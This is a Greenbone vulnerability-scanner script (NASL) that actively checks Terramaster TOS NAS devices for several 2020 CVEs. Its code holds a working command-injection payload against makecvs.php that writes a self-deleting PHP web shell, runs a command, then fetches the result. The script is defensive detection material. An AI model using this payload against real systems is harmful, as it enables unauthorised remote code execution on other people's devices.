# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE_PREFIX = "cpe:/o:terra-master:";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.145118");
  script_version("2023-02-21T10:19:50+0000");
  script_tag(name:"last_modification", value:"2023-02-21 10:19:50 +0000 (Tue, 21 Feb 2023)");
  script_tag(name:"creation_date", value:"2021-01-12 04:24:25 +0000 (Tue, 12 Jan 2021)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-12-28 15:56:00 +0000 (Mon, 28 Dec 2020)");

  script_cve_id("CVE-2020-28184", "CVE-2020-28185", "CVE-2020-28186", "CVE-2020-28187",
                "CVE-2020-28188", "CVE-2020-29189", "CVE-2020-28190", "CVE-2020-35665");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Terramaster TOS < 4.2.07 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_terramaster_nas_http_detect.nasl");
  script_mandatory_keys("terramaster/nas/http/detected");
  script_require_ports("Services/www", 8181);

  script_tag(name:"summary", value:"Terramaster TOS is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - CVE-2020-28184: Cross-site scripting (XSS)

  - CVE-2020-28185: User enumeration

  - CVE-2020-28186: Email injection

  - CVE-2020-28187: Multiple directory traversals

  - CVE-2020-28188: Remote command execution

  - CVE-2020-29189: Incorrect access control

  - CVE-2020-28190: Insecure update channel

  - CVE-2020-35665: Unauthenticated command execution");

  script_tag(name:"affected", value:"Terramaster TOS 4.2.06 and prior.");

  script_tag(name:"solution", value:"Update to version 4.2.07 or later.");

  script_xref(name:"URL", value:"https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www"))
  exit(0);

port = infos["port"];
cpe = infos["cpe"];

cmds = exploit_commands("linux");

foreach pattern (keys(cmds)) {
  vtstrings = get_vt_strings();
  filename = vtstrings["default_rand"] + ".php";

  payload = 'http|echo "<?php system(' + "'" + cmds[pattern] + "'" + '); unlink(__FILE__); ?>" > /usr/www/' +
            filename + ' && chmod +x /usr/www/' + filename + '||';

  url = "/include/makecvs.php?Event=" + payload;

  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req);

  req = http_get(port: port, item: "/" + filename);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {
    report = 'It was possible to execute the "' + cmds[pattern] + '" command.\n\nResult:\n\n' + res;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
